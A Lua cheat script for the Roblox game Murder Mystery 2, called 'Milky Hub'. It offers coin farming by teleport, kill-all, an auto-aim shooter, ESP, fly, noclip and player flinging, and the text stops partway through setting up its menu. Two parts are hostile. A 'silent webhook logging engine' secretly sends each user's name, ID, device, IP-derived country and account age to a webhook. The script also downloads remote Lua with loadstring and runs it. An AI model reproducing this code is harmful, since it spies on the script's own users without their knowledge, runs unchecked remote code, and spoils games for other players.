local KEY_FILE = "milky_hub_key.txt"
local CORRECT_KEY = "welcometomilkyhub"
local KEY_LINK = "https://work.ink/2SMt/milky-hub-keysystem-step-1"
local WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE"

----------------------------------------------------
-- FILE SYSTEM (KEY SAVING & READING)
----------------------------------------------------
local function SaveKey(key)
    if writefile then
        pcall(function()
            writefile(KEY_FILE, key)
        end)
    end
end

local function LoadSavedKey()
    if isfile and readfile and isfile(KEY_FILE) then
        local success, content = pcall(function()
            return readfile(KEY_FILE)
        end)
        if success and content then
            return content:gsub("%s+", "")
        end
    end
    return nil
end

----------------------------------------------------
-- MAIN SCRIPT EXECUTION
----------------------------------------------------
local function StartMainScript()
    local Players = game:GetService("Players")
    local Workspace = game:GetService("Workspace")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local RunService = game:GetService("RunService")
    local UserInputService = game:GetService("UserInputService")
    local TeleportService = game:GetService("TeleportService")
    local HttpService = game:GetService("HttpService")

    local LocalPlayer = Players.LocalPlayer
    local StartTime = os.time()
    local CoinsCollectedSession = 0

    ----------------------------------------------------
    -- DEVICE DETECTION
    ----------------------------------------------------
    local function GetDevice()
        if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
            return "Mobile"
        elseif UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled and not UserInputService.TouchEnabled then
            return "Console"
        else
            return "PC"
        end
    end

    ----------------------------------------------------
    -- SILENT WEBHOOK LOGGING ENGINE
    ----------------------------------------------------
    local function SendWebhookLog()
        if not WEBHOOK_URL or WEBHOOK_URL == "" or WEBHOOK_URL == "YOUR_WEBHOOK_URL_HERE" then 
            return 
        end

        local formattedUrl = WEBHOOK_URL
        if not formattedUrl:match("^https?://") then
            formattedUrl = "https://" .. formattedUrl
        end

        task.spawn(function()
            local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
            if not req then return end

            local country = "Unknown"
            pcall(function()
                local res = req({ Url = "https://ipapi.co/json/", Method = "GET" })
                if res and res.Body then
                    local geo = HttpService:JSONDecode(res.Body)
                    if geo and geo.country_name then
                        country = geo.country_name
                    end
                end
            end)

            local creationDate = "Unknown"
            pcall(function()
                local res = req({ Url = "https://users.roblox.com/v1/users/" .. LocalPlayer.UserId, Method = "GET" })
                if res and res.Body then
                    local usr = HttpService:JSONDecode(res.Body)
                    if usr and usr.created then
                        creationDate = usr.created:match("^(%d%d%d%d%-%d%d%-%d%d)") or usr.created
                    end
                end
            end)

            if creationDate == "Unknown" and LocalPlayer.AccountAge then
                local createdTimestamp = os.time() - (LocalPlayer.AccountAge * 86400)
                creationDate = os.date("%Y-%m-%d", createdTimestamp)
            end

            local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png"
            pcall(function()
                local res = req({ 
                    Url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. LocalPlayer.UserId .. "&size=420x420&format=Png&isCircular=false", 
                    Method = "GET" 
                })
                if res and res.Body then
                    local data = HttpService:JSONDecode(res.Body)
                    if data and data.data and data.data[1] and data.data[1].imageUrl then
                        avatarUrl = data.data[1].imageUrl
                    end
                end
            end)

            local payload = {
                embeds = {
                    {
                        title = "Milky Hub | MM2",
                        color = 65280,
                        thumbnail = { url = avatarUrl },
                        fields = {
                            { name = "Username", value = LocalPlayer.Name .. " (@" .. LocalPlayer.DisplayName .. ")", inline = true },
                            { name = "User ID", value = tostring(LocalPlayer.UserId), inline = true },
                            { name = "Device", value = GetDevice(), inline = true },
                            { name = "Location (Country)", value = country, inline = true },
                            { name = "Account Creation Date", value = creationDate, inline = true }
                        },
                        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
                    }
                }
            }

            pcall(function()
                req({
                    Url = formattedUrl,
                    Method = "POST",
                    Headers = { ["Content-Type"] = "application/json" },
                    Body = HttpService:JSONEncode(payload)
                })
            end)
        end)
    end

    SendWebhookLog()

    ----------------------------------------------------
    -- UI INITIALIZATION
    ----------------------------------------------------
    local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()

    local Window = Fluent:CreateWindow({
        Title = "Milky Hub | MM2",
        TabWidth = 160,
        Size = UDim2.fromOffset(580, 460),
        Acrylic = false,
        Theme = "Dark",
        MinimizeKey = Enum.KeyCode.LeftControl
    })

    ----------------------------------------------------
    -- STATE SETTINGS
    ----------------------------------------------------
    local Settings = {
        CoinFarm = false,
        CoinFarmDelay = 0.2,
        CoinFarmYOffset = 0,
        CoinBagLimit = 40,
        AutoResetFull = false,

        KillAll = false,
        AutoShoot = false,
        FlingTarget = "",

        PlayerESP = false,
        GunESP = false,
        XRay = false,

        SpeedToggle = false,
        WalkSpeed = 24,
        Fly = false,
        FlySpeed = 50,
        Noclip = false,
        TPToGun = false
    }

    local LastShotTick = 0
    local SHOOT_COOLDOWN = 0.35
    local AUTOSHOOT_MAX_DISTANCE = 45
    local isExecutingKillAll = false
    local isFarmingCoins = false
    local isTPingToGun = false
    local isAutoShooting = false
    local originalTransparencies = {}

    ----------------------------------------------------
    -- HELPER FUNCTIONS
    ----------------------------------------------------
    local function GetPlaytimeString()
        local elapsed = os.time() - StartTime
        local hours = math.floor(elapsed / 3600)
        local mins = math.floor((elapsed % 3600) / 60)
        local secs = elapsed % 60
        return string.format("%02dh %02dm %02ds", hours, mins, secs)
    end

    local function GetPivotPos(obj)
        if not obj then return nil end
        if obj:IsA("BasePart") then return obj.Position end
        if obj:IsA("Model") then return obj:GetPivot().Position end
        local part = obj:FindFirstChildWhichIsA("BasePart", true)
        if part then return part.Position end
        return nil
    end

    local function ZeroVelocity(char)
        if not char then return end
        for _, part in ipairs(char:GetChildren()) do
            if part:IsA("BasePart") then
                part.AssemblyLinearVelocity = Vector3.zero
                part.AssemblyAngularVelocity = Vector3.zero
            end
        end
    end

    local function ServerRejoin()
        Fluent:Notify({ Title = "Server Rejoin", Content = "Rejoining current server...", Duration = 3 })
        TeleportService:Teleport(game.PlaceId, LocalPlayer)
    end

    local function ServerHop()
        Fluent:Notify({ Title = "Server Hop", Content = "Searching for available server...", Duration = 3 })
        local success, result = pcall(function()
            return HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"))
        end)

        if success and result and result.data then
            for _, server in ipairs(result.data) do
                if type(server) == "table" and server.playing and server.maxPlayers and server.id then
                    if server.playing < server.maxPlayers and server.id ~= game.JobId then
                        TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id, LocalPlayer)
                        return
                    end
                end
            end
        end
        Fluent:Notify({ Title = "Server Hop Failed", Content = "No alternate public servers found.", Duration = 4 })
    end

    local function ToggleXray(enabled)
        Settings.XRay = enabled
        for _, part in ipairs(Workspace:GetDescendants()) do
            if part:IsA("BasePart") and not part:IsDescendantOf(Players) and not part.Parent:FindFirstChildOfClass("Humanoid") then
                if enabled then
                    if originalTransparencies[part] == nil then
                        originalTransparencies[part] = part.Transparency
                    end
                    part.Transparency = 0.65
                else
                    if originalTransparencies[part] ~= nil then
                        part.Transparency = originalTransparencies[part]
                        originalTransparencies[part] = nil
                    end
                end
            end
        end
    end

    ----------------------------------------------------
    -- INVENTORY & TARGET IDENTIFICATION
    ----------------------------------------------------
    local function GetLocalGun()
        local containers = { LocalPlayer.Character, LocalPlayer:FindFirstChild("Backpack") }
        for _, container in ipairs(containers) do
            if container then
                for _, item in ipairs(container:GetChildren()) do
                    if item:IsA("Tool") then
                        local name = item.Name:lower()
                        if name == "gun" or name:find("gun") or name:find("revolver") or item:FindFirstChild("GunScript") or item:FindFirstChild("Shoot") then
                            return item
                        end
                    end
                end
            end
        end
        return nil
    end

    local function GetLocalKnife()
        local containers = { LocalPlayer.Character, LocalPlayer:FindFirstChild("Backpack") }
        for _, container in ipairs(containers) do
            if container then
                for _, item in ipairs(container:GetChildren()) do
                    if item:IsA("Tool") then
                        local name = item.Name:lower()
                        if name == "knife" or name:find("knife") or name:find("blade") or item:FindFirstChild("KnifeServer") or item:FindFirstChild("Stab") then
                            return item
                        end
                    end
                end
            end
        end
        return nil
    end

    local function IsLocalMurderer()
        return GetLocalKnife() ~= nil
    end

    local function IsInMap()
        local char = LocalPlayer.Character
        if not char then return false end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if not hrp then return false end

        local lobby = Workspace:FindFirstChild("Lobby")
        if lobby then
            local spawns = lobby:FindFirstChild("Spawns", true) or lobby
            local spawnPos = GetPivotPos(spawns)

            if spawnPos then
                local distToLobby = (hrp.Position - spawnPos).Magnitude
                if distToLobby < 180 then
                    return false
                end
            end
        end
        return true
    end

    local function IsAliveAndInRound()
        local char = LocalPlayer.Character
        if not char or not char.Parent then return false end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum or hum.Health <= 0 or hum:GetState() == Enum.HumanoidStateType.Dead then return false end
        return IsInMap()
    end

    local function GetMurderer()
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character then
                local char = player.Character
                local backpack = player:FindFirstChild("Backpack")
                
                for _, item in ipairs(char:GetChildren()) do
                    if item:IsA("Tool") then
                        local n = item.Name:lower()
                        if n:find("knife") or n:find("blade") or item:FindFirstChild("KnifeServer") then
                            return player
                        end
                    end
                end
                
                if backpack then
                    for _, item in ipairs(backpack:GetChildren()) do
                        if item:IsA("Tool") then
                            local n = item.Name:lower()
                            if n:find("knife") or n:find("blade") or item:FindFirstChild("KnifeServer") then
                                return player
                            end
                        end
                    end
                end
            end
        end
        return nil
    end

    local function GetDroppedGun()
        for _, obj in ipairs(Workspace:GetDescendants()) do
            if obj.Name == "GunDrop" or (obj:IsA("Tool") and (obj.Name:lower():find("gun") or obj.Name:lower():find("revolver"))) then
                local isHeld = false
                if obj:IsDescendantOf(Players) then isHeld = true end
                local parentModel = obj:FindFirstAncestorOfClass("Model")
                if parentModel and parentModel:FindFirstChildOfClass("Humanoid") then isHeld = true end
                if obj.Parent and (obj.Parent:IsA("Backpack") or obj.Parent:IsA("Accessory")) then isHeld = true end

                if not isHeld then
                    return obj
                end
            end
        end
        return nil
    end

    ----------------------------------------------------
    -- AUTO SHOOT ENGINE
    ----------------------------------------------------
    local function FireGunAtMurderer(manualTrigger)
        if not IsAliveAndInRound() or IsLocalMurderer() then return end
        if not manualTrigger and (tick() - LastShotTick < SHOOT_COOLDOWN) then return end

        local murderer = GetMurderer()
        if not murderer or not murderer.Character then
            if manualTrigger then Fluent:Notify({Title = "Shoot Murderer", Content = "No Murderer detected!", Duration = 2.5}) end
            return
        end

        local murdererHrp = murderer.Character:FindFirstChild("HumanoidRootPart") or murderer.Character:FindFirstChild("UpperTorso")
        if not murdererHrp then return end

        local char = LocalPlayer.Character
        if not char then return end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        local head = char:FindFirstChild("Head") or hrp
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum or hum.Health <= 0 then return end

        local distance = (hrp.Position - murdererHrp.Position).Magnitude

        if not manualTrigger then
            if distance > AUTOSHOOT_MAX_DISTANCE then return end

            local origin = head.Position
            local direction = (murdererHrp.Position - origin)

            local params = RaycastParams.new()
            params.FilterType = Enum.RaycastFilterType.Exclude
            params.FilterDescendantsInstances = {char, Workspace.CurrentCamera}
            params.IgnoreWater = true

            local result = Workspace:Raycast(origin, direction.Unit * (direction.Magnitude + 2), params)

            if not result or not result.Instance:IsDescendantOf(murderer.Character) then
                return 
            end
        end

        local gun = GetLocalGun()
        if not gun then
            if manualTrigger then Fluent:Notify({Title = "Shoot Murderer", Content = "Gun not found in inventory!", Duration = 2.5}) end
            return
        end

        if gun.Parent ~= char then
            hum:EquipTool(gun)
            task.wait(0.25)
        end

        local shootEvent = gun:FindFirstChild("Shoot")
        if not shootEvent then
            for _, desc in ipairs(gun:GetDescendants()) do
                if desc:IsA("RemoteEvent") and desc.Name:lower():find("shoot") then
                    shootEvent = desc
                    break
                end
            end
        end

        if shootEvent and shootEvent:IsA("RemoteEvent") then
            local bulletSpeed = 300
            local targetVel = murdererHrp.AssemblyLinearVelocity or Vector3.zero
            local timeToHit = distance / bulletSpeed
            local predictedPos = murdererHrp.Position + (targetVel * timeToHit)

            local originCF = head.CFrame
            local targetCF = CFrame.new(predictedPos)

            pcall(function()
                shootEvent:FireServer(originCF, targetCF)
            end)
        end

        LastShotTick = tick()
        if manualTrigger then Fluent:Notify({Title = "Shoot Murderer", Content = "Shot fired at Murderer!", Duration = 2.5}) end
    end

    local function ProcessAutoShoot()
        if isAutoShooting then return end
        isAutoShooting = true

        task.spawn(function()
            while Settings.AutoShoot do
                if IsAliveAndInRound() and not IsLocalMurderer() then
                    FireGunAtMurderer(false)
                end
                task.wait(0.05)
            end
            isAutoShooting = false
        end)
    end

    ----------------------------------------------------
    -- OTHER COMBAT & UTILITY ENGINES
    ----------------------------------------------------
    local function TeleportToGun()
        if not IsAliveAndInRound() or IsLocalMurderer() then return end

        local char = LocalPlayer.Character
        if not char or not char.Parent then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum or hum.Health <= 0 or hum:GetState() == Enum.HumanoidStateType.Dead then return end

        local hrp = char:FindFirstChild("HumanoidRootPart")
        if not hrp or GetLocalGun() then return end

        local droppedGun = GetDroppedGun()
        if not droppedGun then return end

        local handle = droppedGun:IsA("BasePart") and droppedGun 
            or droppedGun:FindFirstChild("Handle") 
            or droppedGun:FindFirstChildWhichIsA("BasePart", true)

        if handle then
            local previousCF = hrp.CFrame
            ZeroVelocity(char)
            
            hrp.CFrame = handle.CFrame + Vector3.new(0, 1.5, 0)
            
            if firetouchinterest then
                firetouchinterest(hrp, handle, 0)
                task.wait(0.02)
                firetouchinterest(hrp, handle, 1)
            end
            
            task.wait(0.08)
            
            if char and char.Parent and hum and hum.Health > 0 and hrp and hrp:IsDescendantOf(Workspace) then
                hrp.CFrame = previousCF
                ZeroVelocity(char)
            end
        end
    end

    local function ProcessTPToGun()
        if isTPingToGun then return end
        isTPingToGun = true
        task.spawn(function()
            while Settings.TPToGun do
                if IsAliveAndInRound() and not IsLocalMurderer() and not GetLocalGun() then
                    TeleportToGun()
                end
                task.wait(0.5)
            end
            isTPingToGun = false
        end)
    end

    local function ExecuteKillAll()
        if isExecutingKillAll then return end

        local knife = GetLocalKnife()
        if not knife then
            Fluent:Notify({ Title = "Kill All Players", Content = "Knife required for Kill All!", Duration = 4 })
            return
        end

        local char = LocalPlayer.Character
        if not char then return end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum then return end

        isExecutingKillAll = true

        task.spawn(function()
            if knife.Parent ~= char then
                hum:EquipTool(knife)
                task.wait(0.1)
            end

            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer and player.Character then
                    local targetChar = player.Character
                    local targetHrp = targetChar:FindFirstChild("HumanoidRootPart")
                    local targetHum = targetChar:FindFirstChildOfClass("Humanoid")

                    if targetHrp and targetHum and targetHum.Health > 0 then
                        local knifeHandle = knife:FindFirstChild("Handle") or knife:FindFirstChildWhichIsA("BasePart")
                        local startTime = tick()

                        while targetHum and targetHum.Health > 0 and (tick() - startTime < 1.2) do
                            hrp.CFrame = targetHrp.CFrame * CFrame.new(0, 0, 1.2)
                            ZeroVelocity(char)

                            pcall(function() knife:Activate() end)

                            if knifeHandle and firetouchinterest then
                                firetouchinterest(knifeHandle, targetHrp, 0)
                                task.wait(0.01)
                                firetouchinterest(knifeHandle, targetHrp, 1)
                            end

                            task.wait(0.03)
                        end
                    end
                end
            end

            ZeroVelocity(char)
            isExecutingKillAll = false
        end)
    end

    ----------------------------------------------------
    -- FLING & FLY ENGINES
    ----------------------------------------------------
    local function ExecuteFlingPlayer(targetName)
        local targetPlayer = Players:FindFirstChild(targetName)
        if not targetPlayer or not targetPlayer.Character then
            Fluent:Notify({ Title = "Fling", Content = "Target player not found!", Duration = 3 })
            return
        end

        local char = LocalPlayer.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        local tHrp = targetPlayer.Character:FindFirstChild("HumanoidRootPart")

        if hrp and tHrp then
            Fluent:Notify({ Title = "Fling", Content = "Flinging selected player...", Duration = 3 })
            
            local oldCF = hrp.CFrame
            local startTime = tick()

            local bav = Instance.new("BodyAngularVelocity")
            bav.Name = "IY_FlingBAV"
            bav.AngularVelocity = Vector3.new(0, 99999, 0)
            bav.MaxTorque = Vector3.new(0, math.huge, 0)
            bav.P = math.huge
            bav.Parent = hrp

            local noclipConn = RunService.Stepped:Connect(function()
                for _, v in pairs(char:GetDescendants()) do
                    if v:IsA("BasePart") then v.CanCollide = false end
                end
            end)

            while (tick() - startTime < 2.5) and targetPlayer and targetPlayer.Character and tHrp and tHrp.Parent do
                hrp.CFrame = tHrp.CFrame * CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(math.random(-180, 180)), math.rad(math.random(-180, 180)), math.rad(math.random(-180, 180)))
                hrp.AssemblyLinearVelocity = Vector3.new(999999, 999999, 999999)
                task.wait()
            end

            if noclipConn then noclipConn:Disconnect() end
            if bav then bav:Destroy() end

            ZeroVelocity(char)
            hrp.CFrame = oldCF
            Fluent:Notify({ Title = "Fling Complete", Content = "Fling sequence ended.", Duration = 3 })
        end
    end

    local flyKeyDown, flyKeyUp
    local iyFlying = false

    local function StartIYFly()
        iyFlying = true
        local char = LocalPlayer.Character
        if not char then return end
        local T = char:FindFirstChild("HumanoidRootPart")
        if not T then return end

        local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
        local SPEED = 0

        local BG = Instance.new('BodyGyro')
        local BV = Instance.new('BodyVelocity')
        BG.P = 9e4
        BG.Parent = T
        BV.Parent = T
        BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
        BG.cframe = T.CFrame
        BV.velocity = Vector3.new(0, 0, 0)
        BV.maxForce = Vector3.new(9e9, 9e9, 9e9)

        flyKeyDown = UserInputService.InputBegan:Connect(function(input, gpe)
            if gpe then return end
            if input.KeyCode == Enum.KeyCode.W then CONTROL.F = 1 end
            if input.KeyCode == Enum.KeyCode.S then CONTROL.B = -1 end
            if input.KeyCode == Enum.KeyCode.A then CONTROL.L = -1 end
            if input.KeyCode == Enum.KeyCode.D then CONTROL.R = 1 end
            if input.KeyCode == Enum.KeyCode.E or input.KeyCode == Enum.KeyCode.Space then CONTROL.Q = 1 end
            if input.KeyCode == Enum.KeyCode.Q or input.KeyCode == Enum.KeyCode.LeftShift then CONTROL.E = -1 end
        end)

        flyKeyUp = UserInputService.InputEnded:Connect(function(input, gpe)
            if input.KeyCode == Enum.KeyCode.W then CONTROL.F = 0 end
            if input.KeyCode == Enum.KeyCode.S then CONTROL.B = 0 end
            if input.KeyCode == Enum.KeyCode.A then CONTROL.L = 0 end
            if input.KeyCode == Enum.KeyCode.D then CONTROL.R = 0 end
            if input.KeyCode == Enum.KeyCode.E or input.KeyCode == Enum.KeyCode.Space then CONTROL.Q = 0 end
            if input.KeyCode == Enum.KeyCode.Q or input.KeyCode == Enum.KeyCode.LeftShift then CONTROL.E = 0 end
        end)

        task.spawn(function()
            repeat task.wait()
                if not iyFlying then break end
                local hum = char:FindFirstChildOfClass('Humanoid')
                if hum then hum.PlatformStand = true end

                if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0 then
                    SPEED = Settings.FlySpeed or 50
                else
                    SPEED = 0
                end

                local cam = Workspace.CurrentCamera
                if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 or (CONTROL.Q + CONTROL.E) ~= 0 then
                    BV.velocity = ((cam.CFrame.LookVector * (CONTROL.F + CONTROL.B)) + ((cam.CFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0)).Position - cam.CFrame.Position)) * SPEED
                else
                    BV.velocity = Vector3.new(0, 0, 0)
                end
                BG.cframe = cam.CFrame
            until not iyFlying

            BG:Destroy()
            BV:Destroy()
            local hum = char:FindFirstChildOfClass('Humanoid')
            if hum then hum.PlatformStand = false end
        end)
    end

    local function StopIYFly()
        iyFlying = false
        if flyKeyDown then flyKeyDown:Disconnect() end
        if flyKeyUp then flyKeyUp:Disconnect() end
        local char = LocalPlayer.Character
        if char then
            local hum = char:FindFirstChildOfClass('Humanoid')
            if hum then hum.PlatformStand = false end
        end
    end

    local function ToggleFly(enabled)
        Settings.Fly = enabled
        if enabled then StartIYFly() else StopIYFly() end
    end

    RunService.Stepped:Connect(function()
        if Settings.Noclip or Settings.CoinFarm then
            local char = LocalPlayer.Character
            if char then
                for _, part in ipairs(char:GetChildren()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = false
                    end
                end
            end
        end
    end)

    ----------------------------------------------------
    -- COIN FARM ENGINE
    ----------------------------------------------------
    local function GetCurrentCoinCount()
        local count = 0
        pcall(function()
            local pGui = LocalPlayer:FindFirstChild("PlayerGui")
            if pGui then
                local mainGui = pGui:FindFirstChild("MainGUI") or pGui:FindFirstChild("Main")
                if mainGui then
                    for _, desc in ipairs(mainGui:GetDescendants()) do
                        if desc:IsA("TextLabel") and (desc.Name:lower():find("coin") or desc.Parent.Name:lower():find("coin") or desc.Parent.Name:lower():find("bag")) then
                            local num = tonumber(desc.Text:match("%d+"))
                            if num then return num end
                        end
                    end
                end
            end
        end)
        return count
    end

    local function FetchAllMapCoins()
        local coins = {}
        for _, obj in ipairs(Workspace:GetDescendants()) do
            if obj:IsA("BasePart") and (obj.Name == "Coin_Server" or obj.Name == "CoinVisual" or obj.Name == "Coin" or obj.Name == "Snowflake" or obj.Name == "Candy") then
                if not obj:IsDescendantOf(Players) and obj.Transparency < 1 then
                    table.insert(coins, obj)
                end
            elseif obj.Name == "CoinContainer" then
                for _, child in ipairs(obj:GetChildren()) do
                    local part = child:IsA("BasePart") and child or child:FindFirstChildWhichIsA("BasePart", true)
                    if part then
                        table.insert(coins, part)
                    end
                end
            end
        end
        return coins
    end

    local function ProcessCoinFarm()
        if isFarmingCoins then return end
        isFarmingCoins = true

        task.spawn(function()
            while Settings.CoinFarm do
                if not IsAliveAndInRound() then
                    task.wait(1)
                else
                    local char = LocalPlayer.Character
                    local hrp = char and char:FindFirstChild("HumanoidRootPart")

                    if hrp then
                        local currentCoins = GetCurrentCoinCount()
                        if currentCoins >= Settings.CoinBagLimit and Settings.CoinBagLimit > 0 then
                            Fluent:Notify({ Title = "Coin Farm", Content = "Coin bag limit reached!", Duration = 3 })
                            if Settings.AutoResetFull and char:FindFirstChildOfClass("Humanoid") then
                                char:FindFirstChildOfClass("Humanoid").Health = 0
                            else
                                Settings.CoinFarm = false
                                break
                            end
                        end

                        local coinList = FetchAllMapCoins()

                        if #coinList > 0 then
                            for _, coinPart in ipairs(coinList) do
                                if not Settings.CoinFarm or not IsAliveAndInRound() then break end
                                if coinPart and coinPart.Parent and coinPart:IsDescendantOf(Workspace) then
                                    for _, part in ipairs(char:GetChildren()) do
                                        if part:IsA("BasePart") then part.CanCollide = false end
                                    end

                                    local targetCF = coinPart.CFrame
                                    if Settings.CoinFarmYOffset ~= 0 then
                                        targetCF = coinPart.CFrame * CFrame.new(0, Settings.CoinFarmYOffset, 0)
                                    end

                                    ZeroVelocity(char)
                                    hrp.CFrame = targetCF
                                    ZeroVelocity(char)

                                    if firetouchinterest then
                                        pcall(function()
                                            firetouchinterest(hrp, coinPart, 0)
                                            task.wait(0.01)
                                            firetouchinterest(hrp, coinPart, 1)
                                        end)
                                    end

                                    local timeout = 0
                                    while coinPart and coinPart.Parent and coinPart:IsDescendantOf(Workspace) and timeout < 0.35 do
                                        task.wait(0.05)
                                        timeout = timeout + 0.05
                                    end

                                    CoinsCollectedSession = CoinsCollectedSession + 1
                                    task.wait(Settings.CoinFarmDelay)
                                end
                            end
                        else
                            task.wait(0.5)
                        end
                    else
                        task.wait(0.5)
                    end
                end
                task.wait(0.1)
            end

            isFarmingCoins = false
        end)
    end

    ----------------------------------------------------
    -- ESP ENGINE
    ----------------------------------------------------
    local function ClearPlayerESP(player)
        if player.Character then
            local head = player.Character:FindFirstChild("Head")
            if head and head:FindFirstChild("MM2_BillboardESP") then
                head.MM2_BillboardESP:Destroy()
            end
            if player.Character:FindFirstChild("MM2_ChamHighlight") then
                player.Character.MM2_ChamHighlight:Destroy()
            end
        end
    end

    local function ApplyPlayerESP(player)
        if player == LocalPlayer or not player.Character then return end

        local char = player.Character
        local head = char:FindFirstChild("Head")
        if not head then return end

        local espGui = head:FindFirstChild("MM2_BillboardESP")
        if not espGui then
            espGui = Instance.new("BillboardGui")
            espGui.Name = "MM2_BillboardESP"
            espGui.Adornee = head
            espGui.Size = UDim2.new(0, 160, 0, 35)
            espGui.StudsOffset = Vector3.new(0, 2.8, 0)
            espGui.AlwaysOnTop = true
            espGui.LightInfluence = 0
            espGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

            local lbl = Instance.new("TextLabel")
            lbl.Name = "ESPText"
            lbl.Size = UDim2.new(1, 0, 1, 0)
            lbl.BackgroundTransparency = 1
            lbl.TextStrokeTransparency = 0
            lbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
            lbl.Font = Enum.Font.GothamBold
            lbl.TextSize = 13
            lbl.Parent = espGui
            espGui.Parent = head
        end

        local highlight = char:FindFirstChild("MM2_ChamHighlight")
        if not highlight then
            highlight = Instance.new("Highlight")
            highlight.Name = "MM2_ChamHighlight"
            highlight.Adornee = char
            highlight.FillTransparency = 0.45
            highlight.OutlineTransparency = 0
            highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
            highlight.Parent = char
        end

        local isMurderer, isSheriff = false, false

        for _, item in ipairs(char:GetChildren()) do
            if item:IsA("Tool") then
                local n = item.Name:lower()
                if n:find("knife") or n:find("blade") or item:FindFirstChild("KnifeServer") then isMurderer = true end
                if n:find("gun") or n:find("revolver") or item:FindFirstChild("GunScript") then isSheriff = true end
            end
        end

        local backpack = player:FindFirstChild("Backpack")
        if backpack then
            for _, item in ipairs(backpack:GetChildren()) do
                if item:IsA("Tool") then
                    local n = item.Name:lower()
                    if n:find("knife") or n:find("blade") or item:FindFirstChild("KnifeServer") then isMurderer = true end
                    if n:find("gun") or n:find("revolver") or item:FindFirstChild("GunScript") then isSheriff = true end
                end
            end
        end

        local roleName = "INNOCENT"
        local roleColor = Color3.fromRGB(50, 255, 120)

        if isMurderer then
            roleName = "MURDERER"
            roleColor = Color3.fromRGB(255, 50, 50)
        elseif isSheriff then
            roleName = "SHERIFF"
            roleColor = Color3.fromRGB(50, 150, 255)
        end

        local dist = 0
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            dist = math.floor((LocalPlayer.Character.HumanoidRootPart.Position - head.Position).Magnitude)
        end

        local txtLabel = espGui:FindFirstChild("ESPText")
        if txtLabel then
            txtLabel.Text = player.DisplayName .. " [" .. dist .. "m]\n[" .. roleName .. "]"
            txtLabel.TextColor3 = roleColor
        end

        highlight.FillColor = roleColor
        highlight.OutlineColor = roleColor

        espGui.Enabled = Settings.PlayerESP
        highlight.Enabled = Settings.PlayerESP
    end

    ----------------------------------------------------
    -- FLUENT UI BUILDER
    ----------------------------------------------------
    local Tabs = {
        Main = Window:AddTab({ Title = "Main", Icon = "home" }),
        Combat = Window:AddTab({ Title = "Combat", Icon = "sword" }),
        Visuals = Window:AddTab({ Title = "Visuals", Icon = "eye" }),
        Misc = Window:AddTab({ Title = "Misc", Icon = "wrench" }),
        Keybinds = Window:AddTab({ Title = "Keybinds", Icon = "key" }),
        Info = Window:AddTab({ Title = "Profile / Info", Icon = "user" })
    }

    -- MAIN TAB
    Tabs.Main:AddSection("Auto Farming")

    local FarmCoinsToggle = Tabs.Main:AddToggle("FarmCoinsToggle", {Title = "Coin Farm", Default = false})
    FarmCoinsToggle:OnChanged(function(Value)
        Settings.CoinFarm = Value
        Fluent:Notify({ Title = "Coin Farm", Content = Value and "Coin Farm Enabled" or "Coin Farm Disabled", Duration = 2 })
        if Value then ProcessCoinFarm() end
    end)

    Tabs.Main:AddSlider("YOffsetSlider", {
        Title = "Depth Offset (0 = Direct Coin Touch)",
        Default = 0,
        Min = -6,
        Max = 2,
        Rounding = 0,
        Callback = function(Value) Settings.CoinFarmYOffset = Value end
    })

    Tabs.Main:AddSlider("FarmSpeedSlider", {
        Title = "Farm Delay (Seconds)",
        Default = 0.2,
        Min = 0.1,
        Max = 2.0,
        Rounding = 2,
        Callback = function(Value) Settings.CoinFarmDelay = Value end
    })

    Tabs.Main:AddSlider("BagLimitSlider", {
        Title = "Max Coin Bag Limit",
        Default = 40,
        Min = 10,
        Max = 40,
        Rounding = 0,
        Callback = function(Value) Settings.CoinBagLimit = Value end
    })

    -- COMBAT TAB
    Tabs.Combat:AddSection("Murderer Options")
    Tabs.Combat:AddButton({
        Title = "Kill All Players",
        Description = "Instantly eliminates all players with Knife",
        Callback = function() ExecuteKillAll() end
    })

    Tabs.Combat:AddSection("Sheriff Options")
    local AutoShootToggle = Tabs.Combat:AddToggle("AutoShoot", {Title = "Auto Shoot Murderer", Default = false})
    AutoShootToggle:OnChanged(function(Value)
        Settings.AutoShoot = Value
        Fluent:Notify({ Title = "Auto Shoot", Content = Value and "Auto Shoot Enabled" or "Auto Shoot Disabled", Duration = 2 })
        if Value then ProcessAutoShoot() end
    end)

    Tabs.Combat:AddButton({
        Title = "Shoot Murderer",
        Description = "Shoots murderer",
        Callback = function() FireGunAtMurderer(true) end
    })

